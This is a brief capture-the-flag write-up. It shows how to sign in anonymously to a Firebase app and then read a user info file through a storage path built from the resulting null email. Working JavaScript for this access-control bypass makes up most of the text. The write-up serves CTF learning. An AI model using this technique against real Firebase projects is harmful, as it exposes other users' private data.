# Flag 2 - Bonus Unexpected Time Traveler II

1. In the description it is written *Guy Fawkes have accessed Biffco*. As *Guy Fawkes* mask is a symbol for *Anonymous group* log 
1. Create an anonymous.
    ```js
    firebase.auth().signInAnonymously();
    ```
1. Notice that the ``currentUser.email`` property is set to ``null``
1. Fetch the corresponding ``info.json`` following the previous flag logic
   ```js
    user = firebase.auth().currentUser;
    ref = firebase.storage().ref(`/users/null/info.json`)
    ref.getDownloadURL().then((url) => {
        fetch(url).then((resp) => 
            resp.json().then((json) => {
                console.log(json);
            })
        )
    })
   ```